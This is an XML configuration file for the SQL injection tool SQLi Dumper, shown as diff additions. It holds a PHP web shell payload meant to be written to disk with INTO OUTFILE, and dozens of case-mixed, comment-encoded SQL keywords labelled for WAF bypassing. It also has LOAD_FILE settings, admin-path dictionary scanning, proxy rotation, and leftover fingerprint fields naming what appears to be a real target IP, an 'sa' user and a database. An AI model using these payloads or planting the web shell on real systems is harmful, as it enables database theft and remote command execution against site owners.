+    <Key Name="rdbOracleTopN_1" Value="True" />
+    <Key Name="grbOracleErrorType" Value="False" />
+    <Key Name="grbMySQLErrorType" Value="False" />
+    <Key Name="rdbMySQLCollactions5" Value="False" />
+    <Key Name="grbOracleCollactions" Value="False" />
+    <Key Name="numSleep" Value="500" />
+    <Key Name="txtSchemaWhere" Value="1=1 or not 1=0" />
+    <Key Name="numLimitMax" Value="0" />
+    <Key Name="rdbMySQLCollactions7" Value="False" />
+    <Key Name="chkDumpFieldByField" Value="False" />
+    <Key Name="rdbMySQLCollactions0" Value="True" />
+    <Key Name="txtURL" Value="http://127.0.0.1/" />
+    <Key Name="rdbOracleErrorType1" Value="True" />
+    <Key Name="grbMSSQLCollactions" Value="False" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="chkDumpIFNULL" Value="True" />
+    <Key Name="numMaxRetryColumn" Value="5" />
+    <Key Name="cmbMSSQLCast" Value="nvarchar" />
+    <Key Name="rdbMySQLErrorType3" Value="False" />
+    <Key Name="rdbOracleErrorType3" Value="False" />
+    <Key Name="lblUser" Value="sa" />
+    <Key Name="lblServer" Value="Apache/2.2.6 (Win32) PHP/5.2.5" />
+    <Key Name="lblVersion" Value="Microsoft SQL Server 2012 (SP1" />
+    <Key Name="lblDatabase" Value="_Central" />
+    <Key Name="lblIP" Value="96.11.126.82" />
+    <Key Name="lblCountry" Value="[US] United States" />
+    <Key Name="lblCountBDs" Value="37" />
+  </Section>
+  <Section Name="frmDumpFile">
+    <Key Name="cmbWrite" Value="INTO OUTFILE" />
+    <Key Name="chkConvert" Value="False" />
+    <Key Name="chkUnHexHex" Value="False" />
+    <Key Name="numTimeOut" Value="5000" />
+    <Key Name="cmbConvertPath" Value="SQL Char" />
+    <Key Name="numSleep" Value="100" />
+    <Key Name="GroupContractable1" Value="False" />
+    <Key Name="txtPost" Value="" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="grbLoadFile" Value="False" />
+    <Key Name="txtCookies" Value="" />
+    <Key Name="txtURL" Value="http://127.0.0.1/" />
+    <Key Name="cmbConvert" Value="USING UTF8" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="txtWritePath" Value="/tmp/tmp.dat" />
+    <Key Name="chkDumpEncodedHex" Value="True" />
+    <Key Name="txtWriteQuery" Value="'&lt;? system($_REQUEST['cmd']); ?&gt;'" />
+    <Key Name="grbScanner" Value="True" />
+    <Key Name="cmbConcat" Value="CONCAT()" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="grbSetup" Value="False" />
+    <Key Name="chkConvertPath" Value="True" />
+    <Key Name="cmbMethod" Value="GET" />
+  </Section>
+  <Section Name="frmTools">
+    <Key Name="txtOfsKey5" Value="%2f**%2fdIsTiNcT" />
+    <Key Name="txtOfsKey15" Value="%2f**%2fgRoUp%2f**%2fbY" />
+    <Key Name="lblOfsKey34" Value="USER()" />
+    <Key Name="txtRemDuplicatesOut" Value="" />
+    <Key Name="txtOfsKey38" Value="vErSiOn()" />
+    <Key Name="lblOfsKey55" Value="TABLES" />
+    <Key Name="txtOfsKey58" Value="tAbLe_sChEmA" />
+    <Key Name="txtRemDuplicatesAddStringEnd" Value="" />
+    <Key Name="chkMusic" Value="False" />
+    <Key Name="txtOfsKey37" Value="%2f**%2fsYsTeM_UsEr" />
+    <Key Name="lblOfsKey16" Value="SUBSTRING" />
+    <Key Name="txtOfsKey32" Value="uNhEx(" />
+    <Key Name="cmbProxiesTypeCheck" Value="Use proxy by random" />
+    <Key Name="lblOfsKey49" Value="`INFORMATION_SCHEMA`" />
+    <Key Name="txtTextValue" Value="" />
+    <Key Name="txtOfsKey65" Value="%2f**%2fcOlUmN_ScHeMa" />
+    <Key Name="txtNotepad" Value="" />
+    <Key Name="lblOfsKey48" Value="`INFORMATION_SCHEMA`" />
+    <Key Name="txtOfsKey60" Value="cOlUmNs" />
+    <Key Name="txtDomain" Value="" />
+    <Key Name="rdbProxy_1" Value="False" />
+    <Key Name="txtUserAgent" Value="Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)" />
+    <Key Name="txtOfsKey10" Value="lImIt" />
+    <Key Name="lblOfsKey26" Value="CONVERT" />
+    <Key Name="txtResolveIP" Value="" />
+    <Key Name="lblOfsKey45" Value="DB_NAME()" />
+    <Key Name="lblOfsKey19" Value="CONCAT" />
+    <Key Name="lblOfsKey67" Value="MASTER" />
+    <Key Name="txtOfsKey19" Value="%2f**%2fcOnCaT(" />
+    <Key Name="lblOfsKey70" Value="SYSOBJECTS" />
+    <Key Name="lblOfsKey59" Value="TABLE_SCHEMA" />
+    <Key Name="lblOfsKey57" Value="TABLE_NAME" />
+    <Key Name="lblOfsKey33" Value="UNHEX" />
+    <Key Name="txtOfsKey57" Value="%2f**%2ftAbLe_nAmE" />
+    <Key Name="lblOfsKey52" Value="SCHEMA_NAME" />
+    <Key Name="lblOfsKey13" Value="ORDER BY" />
+    <Key Name="txtDumpKey" Value="!~!" />
+    <Key Name="txtOfsKey36" Value="sYsTeM_UsEr" />
+    <Key Name="txtOfsKey52" Value="sChEmA_NaMe" />
+    <Key Name="chkRemDuplicatesReplace" Value="False" />
+    <Key Name="txtRemDuplicatesReplace" Value="" />
+    <Key Name="numHttpRetry" Value="5" />
+    <Key Name="txtOfsKey4" Value="dIsTiNcT" />
+    <Key Name="tkbThreads" Value="10" />
+    <Key Name="txtOfsKey21" Value="%2f**%2fcOnCaT_Ws(" />
+    <Key Name="txtOfsKey48" Value="`InFoRmAtIoN_ScHeMa`" />
+    <Key Name="txtOfsKey64" Value="cOlUmN_ScHeMa" />
+    <Key Name="lblOfsKey4" Value="DISTINCT" />
+    <Key Name="chkCryptoKey" Value="False" />
+    <Key Name="lblOfsKey62" Value="COLUMN_NAME" />
+    <Key Name="txtOfsKey1" Value="%2f**%2fuNiOn%2f**%2faLl" />
+    <Key Name="lblOfsKey73" Value="SYSCOLUMNS" />
+    <Key Name="txtOfsKey71" Value="%2f**%2fsYsObJeCtS" />
+    <Key Name="lblOfsKey18" Value="CONCAT" />
+    <Key Name="txtOfsKey59" Value="%2f**%2ftAbLe_sChEmA" />
+    <Key Name="lblOfsKey17" Value="SUBSTRING" />
+    <Key Name="txtOfsKey18" Value="cOnCaT(" />
+    <Key Name="lblOfsKey37" Value="SYSTEM_USER" />
+    <Key Name="lblOfsKey1" Value="UNION ALL" />
+    <Key Name="txtProxyURL" Value="" />
+    <Key Name="lblOfsKey56" Value="TABLE_NAME" />
+    <Key Name="lblOfsKey32" Value="UNHEX" />
+    <Key Name="chkURLReplaceSpaces" Value="True" />
+    <Key Name="txtOfsKey56" Value="tAbLe_nAmE" />
+    <Key Name="numTimeOut" Value="5000" />
+    <Key Name="lblOfsKey41" Value="@@VERSION" />
+    <Key Name="txtExtention" Value="php;asp" />
+    <Key Name="txtURL" Value="http://localhost/" />
+    <Key Name="txtOfsKey6" Value="fRoM" />
+    <Key Name="txtOfsKey25" Value="%2f**%2flOaD_FiLe(" />
+    <Key Name="txtOfsKey41" Value="%2f**%2f@@vErSiOn" />
+    <Key Name="lblOfsKey28" Value="CAST" />
+    <Key Name="txtOfsKey68" Value="sYsDaTaBaSeS" />
+    <Key Name="txtOfsKey20" Value="cOnCaT_Ws(" />
+    <Key Name="lblOfsKey63" Value="COLUMN_NAME" />
+    <Key Name="lblOfsKey2" Value="SELECT" />
+    <Key Name="lblOfsKey53" Value="SCHEMA_NAME" />
+    <Key Name="lblOfsKey66" Value="MASTER" />
+    <Key Name="txtProxyCountry" Value="" />
+    <Key Name="txtRemDuplicatesAddString" Value="" />
+    <Key Name="txtOfsKey63" Value="%2f**%2fcOlUmN_NaMe" />
+    <Key Name="lblOfsKey11" Value="LIMIT" />
+    <Key Name="cmbSQLChar" Value="Char" />
+    <Key Name="chkRemDuplicatesReplaceNewLine" Value="False" />
+    <Key Name="txtOfsKey70" Value="sYsObJeCtS" />
+    <Key Name="txtRemDuplicatesIn" Value="" />
+    <Key Name="txtOfsKey17" Value="%2f**%2fsUbStRiNg(" />
+    <Key Name="lblOfsKey36" Value="SYSTEM_USER" />
+    <Key Name="txtSplitKey" Value="3!P" />
+    <Key Name="txtOfsKey12" Value="oRdEr bY" />
+    <Key Name="lblOfsKey21" Value="CONCAT_WS" />
+    <Key Name="lblOfsKey69" Value="SYSDATABASES" />
+    <Key Name="txtWordDic" Value="\DIC\dic_admin.txt" />
+    <Key Name="txtOfsKey51" Value="%2f**%2fsChEmAtA" />
+    <Key Name="txtOfsKey29" Value="%2f**%2fcAsT(" />
+    <Key Name="txtOfsKey8" Value="wHeRe" />
+    <Key Name="txtOfsKey45" Value="%2f**%2fdB_NaMe()" />
+    <Key Name="lblOfsKey40" Value="@@VERSION" />
+    <Key Name="chkRemDuplicatesAddStringEnd" Value="False" />
+    <Key Name="txtOfsKey24" Value="lOaD_FiLe(" />
+    <Key Name="txtOfsKey40" Value="@@vErSiOn" />
+    <Key Name="chkGroupChar" Value="True" />
+    <Key Name="lblOfsKey8" Value="WHERE" />
+    <Key Name="txtOfsKey67" Value="%2f**%2fmAsTeR" />
+    <Key Name="chkHTTPAllowAutoRedirect" Value="True" />
+    <Key Name="lblOfsKey65" Value="COLUMN_SCHEMA" />
+    <Key Name="lblOfsKey39" Value="VERSION()" />
+    <Key Name="txtLFPassword" Value="" />
+    <Key Name="txtOfsKey31" Value="%2f**%2fhEx(" />
+    <Key Name="lblOfsKey10" Value="LIMIT" />
+    <Key Name="lblOfsKey58" Value="TABLE_SCHEMA" />
+    <Key Name="txtOfsKey14" Value="gRoUp bY" />
+    <Key Name="chkHTTPEncondingParams" Value="False" />
+    <Key Name="lblOfsKey5" Value="DISTINCT" />
+    <Key Name="lblOfsKey72" Value="SYSCOLUMNS" />
+    <Key Name="cmbURLReplaceSpaces" Value="+" />
+    <Key Name="chkRemDuplicates" Value="True" />
+    <Key Name="lblOfsKey15" Value="GROUP BY" />
+    <Key Name="txtOfsKey16" Value="sUbStRiNg(" />
+    <Key Name="lblOfsKey35" Value="USER()" />
+    <Key Name="txtLFUserName" Value="" />
+    <Key Name="txtResolveAddress" Value="" />
+    <Key Name="txtResolveCountry" Value="" />
+    <Key Name="txtOfsKey2" Value="sElEcT" />
+    <Key Name="txtOfsKey49" Value="%2f**%2f`InFoRmAtIoN_ScHeMa`" />
+    <Key Name="lblOfsKey44" Value="DB_NAME()" />
+    <Key Name="lblOfsKey20" Value="CONCAT_WS" />
+    <Key Name="lblOfsKey68" Value="SYSDATABASES" />
+    <Key Name="txtHexValue" Value="" />
+    <Key Name="txtOfsKey28" Value="cAsT(" />
+    <Key Name="cmbDumpKey" Value="Hex" />
+    <Key Name="lblOfsKey6" Value="FROM" />
+    <Key Name="txtOfsKey23" Value="%2f**%2fgRoUp_cOnCaT(" />
+    <Key Name="chkGUIHotKey" Value="False" />
+    <Key Name="txtOfsKey11" Value="%2f**%2flImIt" />
+    <Key Name="txtOfsKey66" Value="mAsTeR" />
+    <Key Name="lblOfsKey51" Value="SCHEMATA" />
+    <Key Name="txtProxies" Value="" />
+    <Key Name="txtOfsKey7" Value="%2f**%2ffRoM" />
+    <Key Name="txtOfsKey35" Value="%2f**%2fuSeR()" />
+    <Key Name="chkScannerSaveTXT" Value="True" />
+    <Key Name="lblOfsKey38" Value="VERSION()" />
+    <Key Name="txtRemDuplicatesReplaceLine" Value="" />
+    <Key Name="txtOfsKey30" Value="hEx(" />
+    <Key Name="txtRemDuplicatesReplaceTo" Value="" />
+    <Key Name="lblOfsKey3" Value="SELECT" />
+    <Key Name="txtOfsKey73" Value="%2f**%2fsYsCoLuMnS" />
+    <Key Name="chkStopScannDetected" Value="True" />
+    <Key Name="lblOfsKey61" Value="COLUMNS" />
+    <Key Name="lblOfsKey14" Value="GROUP BY" />
+    <Key Name="lblOfsKey24" Value="LOAD_FILE" />
+    <Key Name="txtOfsKey13" Value="%2f**%2foRdEr%2f**%2fbY" />
+    <Key Name="cmbCharacterCasing" Value="upper" />
+    <Key Name="lblOfsKey43" Value="DATABASE()" />
+    <Key Name="txtCryptoKey" Value="sqli_dumper_crypto_key" />
+    <Key Name="txtOfsKey27" Value="%2f**%2fcOnVeRt(" />
+    <Key Name="chkRemDuplicatesAddStringFNumber" Value="False" />
+    <Key Name="txtOfsKey43" Value="%2f**%2fdAtAbAsE()" />
+    <Key Name="chkCharacterCasing" Value="False" />
+    <Key Name="numHttpDelay" Value="100" />
+    <Key Name="txtOfsKey22" Value="gRoUp_cOnCaT(" />
+    <Key Name="lblOfsKey31" Value="HEX" />
+    <Key Name="txtOfsKey39" Value="%2f**%2fvErSiOn()" />
+    <Key Name="txtOfsKey9" Value="%2f**%2fwHeRe" />
+    <Key Name="txtOfsKey55" Value="%2f**%2ftAbLeS" />
+    <Key Name="lblOfsKey50" Value="SCHEMATA" />
+    <Key Name="chkRemDuplicatesReplaceLine" Value="False" />
+    <Key Name="txtOfsKey34" Value="uSeR()" />
+    <Key Name="txtOfsKey50" Value="sChEmAtA" />
+    <Key Name="lblOfsKey9" Value="WHERE" />
+    <Key Name="lblOfsKey29" Value="CAST" />
+    <Key Name="txtPassword" Value="" />
+    <Key Name="txtOfsKey44" Value="dB_NaMe()" />
+    <Key Name="txtOfsKey72" Value="sYsCoLuMnS" />
+    <Key Name="txtSQLCharDelimiter" Value="+" />
+    <Key Name="txtOfsKey69" Value="%2f**%2fsYsDaTaBaSeS" />
+    <Key Name="lblOfsKey60" Value="COLUMNS" />
+    <Key Name="chkProxyEnable" Value="False" />
+    <Key Name="txtOfsKey53" Value="%2f**%2fsChEmA_NaMe" />
+    <Key Name="chkRemDuplicatesSort" Value="True" />
+    <Key Name="lblOfsKey47" Value="MYSQL" />
+    <Key Name="lblOfsKey23" Value="GROUP_CONCAT" />
+    <Key Name="cmbWAFS" Value="WAF Bypassing" />
+    <Key Name="txtOfsKey62" Value="cOlUmN_NaMe" />
+    <Key Name="txtOfsKey47" Value="%2f**%2fmYsQl" />
+    <Key Name="lblOfsKey42" Value="DATABASE()" />
+    <Key Name="txtOfsKey26" Value="cOnVeRt(" />
+    <Key Name="grbSetupAdmin" Value="False" />
+    <Key Name="txtOfsKey42" Value="dAtAbAsE()" />
+    <Key Name="rdbProxy_2" Value="True" />
+    <Key Name="cmbCryptoKey" Value="RijnDael" />
+    <Key Name="txtOfsKey3" Value="%2f**%2fsElEcT" />
+    <Key Name="txtProxyCountryCode" Value="" />
+    <Key Name="lblOfsKey54" Value="TABLES" />
+    <Key Name="lblOfsKey30" Value="HEX" />
+    <Key Name="txtUserName" Value="" />
+    <Key Name="chkSysTray" Value="False" />
+    <Key Name="txtOfsKey54" Value="tAbLeS" />
+    <Key Name="lblOfsKey7" Value="FROM" />
+    <Key Name="txtProxyServer" Value="" />
+    <Key Name="numHttpTimeOut" Value="10000" />
+    <Key Name="txtOfsKey33" Value="%2f**%2fuNhEx(" />
+    <Key Name="lblOfsKey12" Value="ORDER BY" />
+    <Key Name="txtSQLCharValue" Value="" />
+    <Key Name="lblOfsKey25" Value="LOAD_FILE" />
+    <Key Name="txtOfsKey0" Value="uNiOn aLl" />
+    <Key Name="lblOfsKey64" Value="COLUMN_SCHEMA" />
+    <Key Name="lblOfsKey27" Value="CONVERT" />
+    <Key Name="lblOfsKey0" Value="UNION ALL" />
+    <Key Name="chkLogin" Value="False" />
+    <Key Name="chkShowIP" Value="False" />
+    <Key Name="lblOfsKey46" Value="MYSQL" />
+    <Key Name="lblOfsKey22" Value="GROUP_CONCAT" />
+    <Key Name="cmbGUIHotKey" Value="A" />
+    <Key Name="txtOfsKey61" Value="%2f**%2fcOlUmNs" />
+    <Key Name="txtOfsKey46" Value="mYsQl" />
+    <Key Name="lblOfsKey71" Value="SYSOBJECTS" />
+    <Key Name="chkRemDuplicatesAddString" Value="False" />
+  </Section>
+  <Section Name="frmDumpGridExporter">
+    <Key Name="LastPath" Value="" />
+    <Key Name="rdpType_1" Value="True" />
+    <Key Name="rdpType_2" Value="False" />
+    <Key Name="rdpType_3" Value="False" />
+    <Key Name="chkReplaceLines" Value="True" />
+    <Key Name="txtReplaceLine" Value="{NewLine}" />
+    <Key Name="rdbOpt2" Value="False" />
+    <Key Name="txtDeli" Value=":" />
+    <Key Name="rdbOpt1" Value="True" />
+  </Section>
+</SQLi_Dumper>
